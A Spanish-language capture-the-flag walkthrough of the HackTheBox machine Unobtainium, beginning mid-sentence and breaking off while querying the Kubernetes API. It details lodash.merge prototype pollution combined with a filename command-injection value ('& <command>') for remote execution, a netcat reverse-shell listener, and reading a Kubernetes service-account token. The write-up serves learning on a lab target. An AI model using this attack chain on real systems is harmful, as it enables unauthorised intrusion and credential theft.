as√≠ tendremos acceso a todos los archivos. YA FIN üßé ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Mucha enumeraci√≥n, algunas vulns conocidas, pero sobre todo bastante llevada a la realidad, me gusta.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ SHS 25.  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Descubrimos que hay en el servidor web del puerto 80.    Descargamos un paquete . deb alojado en la web y lo desbaratamos.     Explotaci√≥n.      Encontramos el c√≥digo fuente de la API con ayuda de BurpSuite.    Contaminamos prototipos para asignar objeto canUpdate.    RCE - Prototype Pollution (lodash. merge) &amp; Command Injection (google-cloudstorage).     Movimiento lateral : docker-webapp -&gt; docker-devnode.      Jugando con la API** y kubectl contra Kubernetes.    RCE interno: Pollution + Command Injection.     Escalada de privilegios.      Encontramos ‚Äúsecreto‚Äù del admin y obtenemos interacci√≥n total con Kubernetes.    Generamos pod malicioso.    ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Lo primero ser√° encontrar que puertos est√°n abiertos en la m√°quina, lo haremos apoyados de nmap: ‚ù± nmap -p- --open -v 10. 10. 10. 235 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Este escaneo nos muestra: ‚ù± cat initScan# Nmap 7. 80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 235# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 235 ()	Status: UpHost: 10. 10. 10. 235 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 2379/open/tcp//etcd-client///, 2380/open/tcp//etcd-server///, 8443/open/tcp//https-alt///, 10250/open/tcp/////, 10256/open/tcp/////, 31337/open/tcp//Elite///# Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 92. 68 seconds      Puerto   Descripci√≥n         22   SSH: Posibilidad de obtener una Shell de manera segura.        80   HTTP: Servidor web.        2379   etcd: Almac√©n de datos de Kubernetes.        2380   etcd: Almac√©n de datos de Kubernetes.        8443   HTTPS: Servidor web con certificado que lo hace m√°s ‚Äúseguro‚Äù.        10250   No lo sabemos a√∫n       10256   No lo sabemos tampoco :P       31337   En internet dicen que se usa para almacenar backdoors, pero pues no estamos seguros de que contiene a√∫n.    Teniendo los puertos, vamos a escanear ahora en b√∫squeda de versiones y scripts relacionados con esos servicios: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 235  [*] Open ports: 22,80,2379,2380,8443,10250,10256,31337[*] Ports copied to clipboard)~ ‚ù± nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV 10. 10. 10. 235 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Obtenemos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV -oN portScan 10. 10. 10. 235Nmap scan report for 10. 10. 10. 235Host is up (0. 11s latency). PORT   STATE SERVICE     VERSION22/tcp  open ssh       OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 2 (Ubuntu Linux; protocol 2. 0)80/tcp  open http       Apache httpd 2. 4. 41 ((Ubuntu))|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: Unobtainium2379/tcp open ssl/etcd-client?|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ h2| tls-nextprotoneg: |_ h22380/tcp open ssl/etcd-server?|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ h2| tls-nextprotoneg: |_ h28443/tcp open ssl/https-alt| fingerprint-strings: |  FourOhFourRequest: |   HTTP/1. 0 403 Forbidden|   Cache-Control: no-cache, private|   Content-Type: application/json|   X-Content-Type-Options: nosniff|   X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39|   X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd|   Date: Wed, 30 Jun 2021 17:06:18 GMT|   Content-Length: 212|   { kind : Status , apiVersion : v1 , metadata :{}, status : Failure , message : forbidden: User  system:anonymous  cannot get path  /nice ports,/Trinity. txt. bak  , reason : Forbidden , details :{}, code :403}|  GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: |   HTTP/1. 1 400 Bad Request|   Content-Type: text/plain; charset=utf-8|   Connection: close|   Request|  HTTPOptions: |   HTTP/1. 0 403 Forbidden|   Cache-Control: no-cache, private|   Content-Type: application/json|   X-Content-Type-Options: nosniff|   X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39|   X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd|   Date: Wed, 30 Jun 2021 17:06:17 GMT|   Content-Length: 189|_  { kind : Status , apiVersion : v1 , metadata :{}, status : Failure , message : forbidden: User  system:anonymous  cannot options path  /  , reason : Forbidden , details :{}, code :403}|_http-title: Site doesn't have a title (application/json). | ssl-cert: Subject: commonName=minikube/organizationName=system:masters| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane. minikube. internal, DNS:kubernetes. default. svc. cluster. local, DNS:kubernetes. default. svc, DNS:kubernetes. default, DNS:kubernetes, DNS:localhost, IP Address:10. 10. 10. 235, IP Address:10. 96. 0. 1, IP Address:127. 0. 0. 1, IP Address:10. 0. 0. 1| Not valid before: 2021-06-29T16:59:25|_Not valid after: 2022-06-30T16:59:25|_ssl-date: TLS randomness does not represent time| tls-alpn: |  h2|_ http/1. 110250/tcp open ssl/http     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Site doesn't have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=unobtainium@1610865428| Subject Alternative Name: DNS:unobtainium| Not valid before: 2021-01-17T05:37:08|_Not valid after: 2022-01-17T05:37:08|_ssl-date: TLS randomness does not represent time| tls-alpn: |  h2|_ http/1. 110256/tcp open http       Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Site doesn't have a title (text/plain; charset=utf-8). 31337/tcp open http       Node. js Express framework| http-methods: |_ Potentially risky methods: PUT DELETE|_http-title: Site doesn't have a title (application/json; charset=utf-8). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port8443-TCP:V=7. 80%T=SSL%I=7%D=6/30%Time=60DCA3A3%P=x86_64-pc-linux-gnSF:u%r(HTTPOptions,203, HTTP/1. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20Reques. . . # cositas que no nos sirven. . . SF:t );Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 234. 27 secondsPodemos destacar algunas cosas:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 2       80   HTTP   Apache httpd 2. 4. 41       2379   HTTPS   No esta seguro, pero vamos a quedarnos con ese resultado: etcd-client       2380   HTTPS   Igual, vamos a quedarnos con ese resultado: etcd-server       8443   HTTPS   No nos muestra    Un formato json algo interesante:{ . . .   message : forbidden: User  system:anonymous  cannot get path  /nice ports,/Trinity. txt. bak  , . . . } Vemos un archivo que quiz√°s sea relevante como pueda que no, guard√©moslo: /Trinity. txt. bak.  Un dominio control-plane. minikube. internal, realmente varios, pero este me llama la atenci√≥n.       Puerto   Servicio   Versi√≥n         10250   HTTPS   Golang net/http server (Go-IPFS json-rpc or InfluxDB API)    Un nombre de servidor algo extra√±o: unobtainium@1610865428.       Puerto   Servicio   Versi√≥n         10256   HTTP   Golang net/http server (Go-IPFS json-rpc or InfluxDB API)       31337   HTTPS   Node. js Express framework   Opa, bastantes cositas, pues empecemos a jugar con cada uno a ver por donde le damos duro a esta m√°quina. ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Una web sencilla describi√©ndonos una aplicaci√≥n para chatear‚Ä¶ Vemos 4 botones, los 4 contienen redirects: - Unobtainium nos lleva a http://10. 10. 10. 235/downloads/checksums. txt- Download deb a http://10. 10. 10. 235/downloads/unobtainium_debian. zip- Download rpm a http://10. 10. 10. 235/downloads/unobtainium_redhat. zip- Download snap a http://10. 10. 10. 235/downloads/unobtainium_snap. zipSi vamos al link de Unobtainium encontramos los hashes correspondientes a cada binario subido (que supongo estar√°n dentro de los . zip), estos hashes nos sirven para comprobar que lo que descarguemos no ha sido modificado en el proceso.  Jugando con unobtainium_debian. zip: ¬øPor qu√© el de Debian? Bueno, estoy en ParrotOS y es un sistema operativo basado en Debian y deb hace referencia a los paquetes de software para Debian. Lo descargamos en la m√°quina, lo descomprimimos y obtenemos: ‚ù± ls unobtainium_1. 0. 0_amd64. deb unobtainium_1. 0. 0_amd64. deb. md5sumHacemos la comprobacion de hashes: ‚ù± curl -s http://10. 10. 10. 235/downloads/checksums. txt | grep debc9fe8a2bbc66290405803c3d4a37cf28 unobtainium_1. 0. 0_amd64. deb‚ù± md5sum unobtainium_1. 0. 0_amd64. debc9fe8a2bbc66290405803c3d4a37cf28 unobtainium_1. 0. 0_amd64. debListo, todo perfecto con el paquete, es el original. Abrimos el paquete . deb üìå: Algo que encontr√© bastante interesante fue que los paquetes . deb traen consigo 3 archivos que son los que contienen lo que se va a instalar en el sistema:  debian-binary que contiene la versi√≥n del paquete . deb.  control. tar. gz que tiene algunos hashes y los controles para la construcci√≥n del paquete.  Y data. tar. gz que contiene todos los archivos a ser instalados. Para verlos, podemos jugar con la herramienta ar y su par√°metro t: ‚ù± ar t unobtainium_1. 0. 0_amd64. deb debian-binarycontrol. tar. gzdata. tar. xzY para extraerlos del paquete usamos el par√°metro x: ‚ù± ar x unobtainium_1. 0. 0_amd64. deb‚ù± lscontrol. tar. gz data. tar. xz debian-binary unobtainium_1. 0. 0_amd64. debBien, ahora para extraer el contenido de esos comprimidos jugamos con tar: üî¶ control: ‚ù± tar xvf control. tar. gz . /. /postinst. /postrm. /control. /md5sumsüî¶ data: ‚ù± tar xvf data. tar. xz. /. /usr/. /usr/share/. . . . . . . . . . /opt/unobtainium/LICENSES. chromium. html. /opt/unobtainium/libvk_swiftshader. soBien, enumerando los dos encontramos algunas cosas muy lindas‚Ä¶ Exploramos el contenido de data. tar. gz üß∑: Nos extrae dos carpetas, /usr (que tiene el icono del programa y cosas de cara al usuario) y /opt (que tiene todos los archivos necesarios para instalar el binario y su correcto funcionamiento)‚Ä¶ Bas√°ndome en una m√°quina que hicimos que usaba Electron record√© que existe un archivo . asar el cual contiene todos los fuentes y c√≥digo con el que fue creado alg√∫n proyecto. Pues buscandoooo lo encontramos en /opt/unobtainium/resources (: Ya con ese archivo podemos aprovechar el uso de un m√≥dulo de node para obtener el c√≥digo fuente de la aplicaci√≥n, en este caso del binario unobtainium.  How to get the source code of any electron application. Siguiendo los pasos de ese recurso logramos extraer varios archivos: ‚ù± mkdir files_unobtainium‚ù± asar extract app. asar files_unobtainium/‚ù± cd files_unobtainium/‚ù± lsindex. js package. json srcViendo el archivo package. json obtenemos un posible usuario, vemos un dominio y un email: ‚ù± cat package. json{  name :  unobtainium ,  version :  1. 0. 0 ,  description :  client ,  main :  index. js ,  homepage :  http://unobtainium. htb ,  author :  felamos &lt;felamos@unobtainium. htb&gt; ,  license :  ISC }En la carpeta src/ est√°n todos los archivos usados por la aplicaci√≥n: ‚ù± tree src/src/‚îú‚îÄ‚îÄ css‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bootstrap. min. css‚îÇ¬†¬† ‚îî‚îÄ‚îÄ dashboard. css‚îú‚îÄ‚îÄ get. html‚îú‚îÄ‚îÄ index. html‚îú‚îÄ‚îÄ js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ app. js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bootstrap. bundle. min. js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ Chart. min. js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ check. js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ dashboard. js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ feather. min. js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ get. js‚îÇ¬†¬† ‚îú‚îÄ‚îÄ jquery. min. js‚îÇ¬†¬† ‚îî‚îÄ‚îÄ todo. js‚îú‚îÄ‚îÄ post. html‚îî‚îÄ‚îÄ todo. htmlNo vamos a repasar todos, pero si destacaremos cositas‚Ä¶ Por ejemplo el archivo src/js/app. js toma el valor de una variable llamada message y lo sube (m√©todo PUT) al servicio http://unobtainium. htb:31337/: $(document). ready(function(){  $( #but_submit ). click(function(){    var message = $( #message ). val(). trim();    $. ajax({    url: 'http://unobtainium. htb:31337/',    type: 'put',    dataType:'json',    contentType:'application/json',    processData: false,    data: JSON. stringify({ auth : { name :  felamos ,  password :  Winter2021 },  message : { text : message}}),    success: function(data) {      //$( #output ). html(JSON. stringify(data));      $( #output ). html( Message has been sent! );    }  });});}); Adem√°s del peque√±o detalle que tenemos unas credenciales üò≤ Pues veamos esto en funcionamiento‚Ä¶ Ya vimos los fuentes y no hay nada extra√±o que nos haga pensar que vamos a ser espiados :P instal√©mosla: ‚ù± dpkg -i unobtainium_1. 0. 0_amd64. debDespu√©s de unos segundos ya lo tendr√≠amos instalado en el sistema, lo ejecutamos y obtenemos: Es una aplicaci√≥n creada con Electron (ya hemos visto cositas de √©l en otro post que no rese√±o para no spoiler la m√°quina en la que se usa, pero esta por ac√°). Al abrirlo nos indica que no encuentra el dominio unobtainium. htb, pues agreg√°ndolo al archivo /etc/hosts se soluciona: ‚ù± cat /etc/hosts. . . 10. 10. 10. 235 unobtainium. htb. . . Esto nos da a entender que el software se esta comunicando para X cosa con la direcci√≥n IP 10. 10. 10. 235, o sea, la m√°quina (ya vimos en los archivos del paquete el porqu√©)‚Ä¶ Dando algunas vueltas y clics llegamos al apartado Todo: Tenemos una lista de tareas, pero me dejan m√°s perdido de lo que estaba, as√≠ que segu√≠ probando el software y caemos en Post Messages: Que si recordamos estaba el archivo app. js que era el encargado de esta parte, la de postear los mensajes en la ruta http://unobtainium. htb:31337/. Despu√©s de mandar algunos mensajes (‚Äúhola‚Äù, ‚Äútest‚Äù y ‚Äúesto‚Äù) y estar visitando esa URL vemos que por cada petici√≥n var√≠a lo que se muestra, no siempre tenemos el mismo output aunque no cambiemos nada en la petici√≥n, hagamos un bucle de 10 peticiones para que se entienda lo que digo:  (Cada vez que subimos un mensaje nos tiene que responder Message has been sent!, si no, no se esta subiendo el mensaje) ‚ù± for i in $(seq 1 10); do echo -n  $i &gt;&gt;  ; curl -k -s http://unobtainium. htb:31337; echo; sleep 1; done1 &gt;&gt; [{ icon : __ , text : hola , id :1, timestamp :1625093446861, userName : felamos },{ icon : __ , text : test , id :2, timestamp :1625093587859, userName : felamos }]2 &gt;&gt; [{ icon : __ , text : hola , id :1, timestamp :1625093446861, userName : felamos },{ icon : __ , text : test , id :2, timestamp :1625093587859, userName : felamos }]3 &gt;&gt; [{ icon : __ , text : esto , id :1, timestamp :1625093741331, userName : felamos }]4 &gt;&gt; [{ icon : __ , text : hola , id :1, timestamp :1625093446861, userName : felamos },{ icon : __ , text : test , id :2, timestamp :1625093587859, userName : felamos }]5 &gt;&gt; [{ icon : __ , text : esto , id :1, timestamp :1625093741331, userName : felamos }]6 &gt;&gt; [{ icon : __ , text : esto , id :1, timestamp :1625093741331, userName : felamos }]7 &gt;&gt; []8 &gt;&gt; [{ icon : __ , text : hola , id :1, timestamp :1625093446861, userName : felamos },{ icon : __ , text : test , id :2, timestamp :1625093587859, userName : felamos }]9 &gt;&gt; []10 &gt;&gt; [{ icon : __ , text : esto , id :1, timestamp :1625093741331, userName : felamos }]Todas son creadas por felamos (tambi√©n lo vimos en el archivo app. js). No s√© el porqu√© a veces no muestra o muestra cualquier mensaje‚Ä¶ Pero bueno, los vemos reflejados en el puerto 31337, o sea, esa es la API de la que se habla en el √≠tem 2 del todo. Adem√°s tenemos el formato con el que son guardadas, vemos un campo icon (que no me imagino para que pueda ser) y los dem√°s que si tienen sentido. ‚Ä¶ Explotaci√≥n #Jugando con BurpSuite y con las variables de entorno en Linux logramos interceptar la petici√≥n al enviar un mensaje: Validamos el puerto por el que escucha el proxy de Burp: Seteamos una variable de Linux que toma el proxy: ‚ù± export http_proxy=http://127. 0. 0. 1:8080/Ponemos a Burp en escucha y enviamos un mensaje: Y en Burp recibimos:  (Si nos les funciona a la primera, cierren el programa, pongan el proxy en escucha y vuelvanlo a abrir. O pueda que hayan declarado la variable en una terminal distinta de la que usan para ejecutar el binario :O) Vemos como viaja la petici√≥n, tenemos la versi√≥n de Electron y de nuevo las credenciales üôÉ  No logramos hacer nada al intentar injectar cositas con el mensaje :( ‚Ä¶ Encontramos el c√≥digo fuente de la API üìå: D√°ndole algunas vuelticas al binario y sus peticiones me llamo la atenci√≥n lo que hace cuando vemos la lista de tareas, o sea, Todo: Vemos que la lista la obtiene de un archivo llamado todo. txt :o Esto nos da ideas de intentar leer otros archivos, intentando e intentando no encontramos ning√∫n archivo üòî, pero encontramos un error al probar algunas cadenas o incluso dejando el campo vac√≠o üòÑ Y si, no encuentra X archivo por lo tanto no sabe que hacer y devuelve un error (lo que esta mal es que se muestre el error as√≠ como as√≠ :P). Vemos unas rutas: /usr/src/app/index. js/usr/src/app/node_modules/express/lib/router/route. js/usr/src/app/node_modules/express/lib/router/layer. js/usr/src/app/node_modules/express/lib/router/index. jsVer esas rutas me dio la idea de buscar en el sistema los archivos relacionados con unobtainium a ver si hab√≠a alguno llamado todo. txt y as√≠ tener una idea de donde esta tom√°ndolo el servidor web (pero nelson, no encontramos) (Pruebas, pruebas y pruebas) Apoyados en nuestra ‚Äúabrizhion del paquete‚Äù vemos que el archivo /usr/src/app/index. js tambi√©n lo tenemos y esta junto al objeto package. json (que ya vimos antes). Pues enviando tanto el archivo index. js como package. json en el campo filename logramos obtener respuesta (: üî¶ package. json: Tomamos el contenido y lo guardamos en un archivo, para pasarlo a un formato m√°s lindo podemos hacer esto: Remplazamos el texto \n por un salto de l√≠nea real y quitamos los escapes que hay en las comillas: ‚ù± sed -i 's/\\n/\n/g' todo_package. json ‚ù± sed -i 's/\\ / /g' todo_package. json ‚ù± cat todo_package. json {  name :  Unobtainium-Server ,  version :  1. 0. 0 ,  description :  API Service for Electron client ,  main :  index. js ,  scripts : {   start :  node index. js  },  author :  felamos ,  license :  ISC ,  dependencies : {   body-parser :  1. 18. 3 ,   express :  4. 16. 4 ,   lodash :  4. 17. 4 ,   google-cloudstorage-commands :  0. 0. 1  },  devDependencies : {}}Opa, es la descripci√≥n del app, vemos las dependencias (librer√≠as que usa) y sus versiones, me gusta. D√°ndole un formato lindo al archivo index. js obtenemos el c√≥digo base de la aplicaci√≥n :o ‚ù± sed -i 's/\\n/\n/g' todo_index. js ‚ù± sed -i 's/\\t/ /g' todo_index. js ‚ù± sed -i 's/\\ / /g' todo_index. js ‚ù± cat todo_index. js Agregue unos comentarios para que sea un poco m√°s entendible cada parte. var root = require( google-cloudstorage-commands );const express = require('express');const { exec } = require( child_process );const bodyParser = require('body-parser');const _ = require('lodash');const app = express();var fs = require('fs');const users = [ {name: 'felamos', password: 'Winter2021'}, {name: 'admin', password: Math. random(). toString(32), canDelete: true, canUpload: true},];let messages = [];let lastId = 1;function findUser(auth) { return users. find((u) =&gt;  u. name === auth. name &amp;&amp;  u. password === auth. password);}app. use(bodyParser. json());// Validamos el mensaje que creamos (M√©todo GET)app. get('/', (req, res) =&gt; { res. send(messages);});// Sube el mensaje (M√©todo PUT)app. put('/', (req, res) =&gt; { const user = findUser(req. body. auth || {}); if (!user) {  res. status(403). send({ok: false, error: 'Access denied'});  return; } const message = {  icon: '__', }; _. merge(message, req. body. message, {  id: lastId++,  timestamp: Date. now(),  userName: user. name, }); messages. push(message); res. send({ok: true});});// Borra el mensaje (M√©todo DELETE)app. delete('/', (req, res) =&gt; { const user = findUser(req. body. auth || {}); if (!user || !user. canDelete) {  res. status(403). send({ok: false, error: 'Access denied'});  return; } messages = messages. filter((m) =&gt; m. id !== req. body. messageId); res. send({ok: true});});// Al parecer sube un archivo (M√©todo POST)app. post('/upload', (req, res) =&gt; { const user = findUser(req. body. auth || {}); if (!user || !user. canUpload) {  res. status(403). send({ok: false, error: 'Access denied'});  return; } filename = req. body. filename; root. upload( . / ,filename, true); res. send({ok: true, Uploaded_File: filename});});// Extrae la info de un archivo y la muestra (M√©todo POST)app. post('/todo', (req, res) =&gt; { const user = findUser(req. body. auth || {}); if (!user) {  res. status(403). send({ok: false, error: 'Access denied'});  return; } filename = req. body. filename;    testFolder =  /usr/src/app ;    fs. readdirSync(testFolder). forEach(file =&gt; {        if (file. indexOf(filename) &gt; -1) {            var buffer = fs. readFileSync(filename). toString();            res. send({ok: true, content: buffer});        }    });});app. listen(3000);console. log('Listening on port 3000. . . ');Perfecto, perfectisimoooooooooooooooooooooooo, varias cositas para ver‚Ä¶ Vemos los usuarios encargados de hacer las peticiones, a admin es la primera vez que lo vemos, pero poco podemos hacer con √©l, ya que su contrase√±a es random :(  admin tiene dos items que felamos no tiene, canDelete y canUpdate, los dos est√°n en true. Esto toma sentido si miramos la funci√≥n que sube un archivo: üî¶ /upload - ¬øuser. canUpload? app. post('/upload', (req, res) =&gt; { const user = findUser(req. body. auth || {}); if (!user || !user. canUpload) {  res. status(403). send({ok: false, error: 'Access denied'});  return; } filename = req. body. filename; root. upload( . / ,filename, true); res. send({ok: true, Uploaded_File: filename});});V√°lida si el usuario que esta haciendo la petici√≥n trae consigo el √≠tem canUpload encendido, si s√≠, toma el valor de filename y lo sube al servidor a la ruta en la que est√© el archivo index. js, o sea, si logramos subir un archivo podr√≠amos ver su contenido con el feature Todo (: Perfectoowowow, pues podr√≠amos intentar jugar con ese objeto y el usuario felamos a ver si logramos subir o crear un archivo: Si hacemos peticiones hacia el recurso /upload sin el objeto: Claramente no nos deja, ahora intentemos con el objeto  canUpload :true: Pero tampoco nos deja :( Probando y probando no logramos subir nada‚Ä¶ Leyendo lo que hace la funci√≥n /upload vemos que para el tr√°mite usa una -funci√≥n- de una de las librer√≠as: var root = require( google-cloudstorage-commands );. . . . . .  root. upload( . / ,filename, true);. . . Buscando info sobre ella (estaba buscando su uso, pero de los primeros resultados hab√≠a uno que hablaba de vulnerabilidades :o) encontramos que es una librer√≠a deprecada yyyy que tiene una vulnerabilidad: Opa, curiosamente es el mismo formato que tenemos nosotros en el script. La vulnerabilidad es sencilla, una inyecci√≥n de comandos por culpa de una mala sanitizaci√≥n (:  Command Injection - google-cloudstorage-commands. La cosa es que este bug no nos permitir√° subir un archivo, ya que no le indicara al servicio que nos active el objeto canUpload. Pero esta interesante tenerlo por si conseguimos asignarnos el objeto. Con la idea de mirar las librer√≠as nos situamos ahora en lodash, que es usada en la creaci√≥n del mensaje: const _ = require('lodash');. . . . . .  _. merge(message, req. body. message, {  id: lastId++,  timestamp: Date. now(),  userName: user. name, });. . . Ah√≠ est√°n los campos que vimos al hacer las 10 peticiones con el for y el mensaje es manipulado con req. body. message. Algo que vemos es el uso de la funci√≥n merge(), que b√°sicamente juega con tres objetos:  (1) message.  (2) req. body. message.  (3) id - timestamp - username. Y los usa para tomar las propiedades de los objetos 2 y 3 yyyyy hered√°rselos al objeto 1, as√≠ de sencillo. Este es un ejemplo que encontr√©: Y esta ser√≠a una simulaci√≥n de lo que pasa al crear el mensaje y como la variable message hereda el valor del mensaje que enviamos junto a los dem√°s objetos: Perfecto, sabemos como se genera toooda la trama que vemos al crear un mensaje (: ‚Ä¶ Prototype Pollution en lodash. merge para asignar canUpdate al usuario felamos üìå: La cosa es que buscando info sobre merge() y si existen vulnerabilidades para ella nos damos cuenta de que s√≠, existen cositas para jugar‚Ä¶  Prototype Pollution - lodash. merge. La contaminaci√≥n de prototipos se basa en la inyecci√≥n de propiedades dentro de -prototipos- existentes en JS, como pueden ser los objetos. Cuando un objeto es creado va a contener propiedades y m√©todos necesarios de un prototipo (ya que JS esta basado en prototipos), esos prototipos contienen atributos ‚Äúm√°gicos‚Äù o ‚Äúesenciales‚Äù tales como _proto_, constructor y prototype. Lo que pasa es que JS permite que esos atributos sean alterados, esto (por culpa de merge()) le da la mano al atacante (a nosotros) de sobreescribir o contaminar objetos de la aplicaci√≥n ü§Ø Nos guiaremos de este recurso para probar la contaminaci√≥n:  Demonstration of _. merge pollution vulnerability. Lo que hace es subir un archivo que contiene el atributo -m√°gico- _proto_ con el objeto que quiere contaminar, o sea, cambiar. Sube attack. json: Muy sencillo, al usuario john. doe@mail. com le asigna el objeto admin‚Ä¶ Nosotros podr√≠amos probar a asignar canUpdate al usuario felamos usando el mismo atributo e intentar subir (/upload) alg√∫n archivo üëÄ: Pero no, espero que alguno sepa ya el porqu√©‚Ä¶ :P B√°sicamente es porque la funci√≥n vulnerable (merge()) esta en la creaci√≥n del mensaje y no en la subida del archivo, entonces primero debemos contaminar el objeto para luego ah√≠ si probar si se nos asign√≥ el poder de subir archivos (: Creamos mensaje maligno :P Y ahora intentamos subir un archivoooooooooooooooooooooooooooooo: PERFECTOOOOOOOOOO, podemos subir archivoooooooooooslsssssssslakdjflasdflasjdfl (: Intentando ver el archivo (que no tiene contenido :P) el servidor se muere e. e Peeeero tooodos tranquilos, recordemos nuestra vulnerabilidad con google-cloudstorage-commands. ‚Ä¶ RCE = Prototype Pollution (lodash. merge) + Command Injection (google-cloudstorage) üìå: Ya podemos crear archivos, tenemos la posibilidad de pasarle el nombre del archivo, veamos como era la inyecci√≥n de comandos: Simplemente debemos colocar: &amp; &lt;comando_que_queremos_ejecutar&gt;Va a tomar un nombre vac√≠o y despu√©s ejecutar√≠a el comando, a√∫n no hemos comprobado que funcione, pero pa eso estamos, ¬øno? a veeeeeeeeer: Lo que queremos es que tome el resultado del comando id y lo guarde en el archivo hola. txt, as√≠ validamos su contenido con Todo, el archivo se cre√≥, por lo que esperamos que se haya ejecutado el comando, validemos: Yyyyyyyy s√≠, tenemos ejecuci√≥n remota de comandosssssss, que bestialidad esooooooooo, me encantoooooooooooooooo‚Ä¶ Pues aprovechemonos de esto para entablarnos una Reverse Shell. Nos ponemos en escucha: ‚ù± nc -lvp 4433Y ejecutamos: Revisamos nuestro listener yyyyyyyyyyyyyyyyyyyyy: Sip, es bastante fea jajaj, hacemos un tratamiento de TTY superr√°pido y tamos listos pa seguir (:  https://lanzt. gitbook. io/cheatsheet-pentest/tty. Estamos en un contenedor (: y en √©l tenemos acceso a la flag de usuario user. txt. ‚Ä¶ Con ayuda de Python creamos un script que ya sea, nos ejecuta algunos comandos remotamente o nos entabla una Shell en el propio script, ah√≠ se los dejo (:  pollutionRCE. py ‚Ä¶ docker-webapp -&gt; docker-devnode #Estando dentro encontramos poquitas cosas, enumerando las variables de entorno tenemos algunas referencias a Kubernetes: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ env La aplicaci√≥n en 10. 96. 137. 170:3000 fue la que explotamos. Nos llama la atenci√≥n 10. 96. 0. 1:443, jugando con cURL nos responde: root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl -k https://10. 96. 0. 1:443{  kind :  Status ,  apiVersion :  v1 ,  metadata : {   },  status :  Failure ,  message :  forbidden: User \ system:anonymous\  cannot get path \ /\  ,  reason :  Forbidden ,  details : {   },  code : 403}Jmmm‚Ä¶ Investigando sobre Kubernetes encontramos cositas interesantes:  Tomada de: docker-a-kubernetes. Y si, ah√≠ entra Kubernetes: En pocas palabras es un gestionador de contenedores (el ‚Äúmaestro de orquesta‚Äù), ayuda a reunir tooodos los contenedores y armar cl√∫steres (para que trabajen como si fueran uno), ya teni√©ndolos es muuuucho m√°s sencillo el administrarlos, implementarlos y escalarlos.  kubernetes. io - What is Kubernetes.  azure. microsoft. com - What is Kubernetes.  redhat. com - What is Kubernetes. Buscando como podemos comunicarnos con Kubernetes llegamos a este recurso: Validando si tenemos los archivos necesarios vemos que si: root@webapp-deployment-5d764566f4-mbprj:/var/run/secrets/kubernetes. io/serviceaccount$ lsca. crt namespace tokenJugando con la API y con kubectl üìå: As√≠ que generemos esas variables e intentemos de nuevo usar cURL: root@webapp-deployment-5d764566f4-mbprj:~$ APISERVER=https://10. 96. 0. 1:443root@webapp-deployment-5d764566f4-mbprj:~$ SERVICEACCOUNT=/var/run/secrets/kubernetes. io/serviceaccountroot@webapp-deployment-5d764566f4-mbprj:~$ TOKEN=$(cat ${SERVICEACCOUNT}/token)root@webapp-deployment-5d764566f4-mbprj:~$ CACERT=${SERVICEACCOUNT}/ca. crtIntentamos la petici√≥n hacia la API: root@webapp-deployment-5d764566f4-mbprj:/$ curl --cacert ${CACERT} --header  Authorization: Bearer ${TOKEN}  -X GET ${APISERVER}/api{  kind :  APIVersions ,  